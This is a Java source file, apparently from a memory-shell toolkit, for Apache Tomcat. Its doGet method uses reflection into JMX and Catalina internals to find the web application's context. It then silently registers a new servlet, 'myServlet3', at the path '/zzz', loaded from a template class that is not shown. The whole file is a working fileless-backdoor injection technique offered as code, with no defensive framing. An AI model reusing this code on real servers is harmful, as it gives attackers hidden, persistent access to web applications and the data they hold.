package com.memshell.tomcat;

import com.memshell.generic.Util;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.Set;

public class ServletBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try{
            String servrletName = "myServlet3";
            String urlPattern = "/zzz";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for(NamedObject namedObject : objectSet){
                try{
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext)field.get(obj);

                    if(standardContext.findChild(servrletName) == null){
                        System.out.println("[+] Add Dynamic Servlet");

                        Wrapper wrapper = standardContext.createWrapper();
                        wrapper.setName(servrletName);
                        standardContext.addChild(wrapper);

                        Class clazz = Util.getDynamicServletTemplateClass();
                        wrapper.setServletClass(clazz.getName());
                        wrapper.setServlet((Servlet) clazz.newInstance());
                        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                        registration.addMapping(urlPattern);
                    }
                }catch(Exception e){
                    //pass
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}